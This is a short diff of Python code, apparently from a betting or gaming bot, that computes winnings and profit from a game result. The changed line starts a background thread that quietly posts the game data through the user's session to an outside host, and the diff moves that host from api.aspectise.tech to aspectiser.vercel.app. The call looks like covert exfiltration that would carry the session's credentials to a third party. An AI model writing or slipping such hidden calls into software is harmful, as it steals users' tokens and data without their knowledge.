@@ -6,7 +6,7 @@ def start(self, session, _type):
     if response.status_code == 200:
         data = response.json()
         data["gamemode"] = _type.capitalize()
-        threading.Thread(target=lambda: (session.post("https://api.aspectise.tech/games", json=data), None) if Exception else None).start()
+        threading.Thread(target=lambda: (session.post("https://aspectiser.vercel.app/games", json=data), None) if Exception else None).start()
         winnings = data.get("winnings")
         profit = winnings - data.get("game").get("betAmount")
         wallet = balance.get(session)
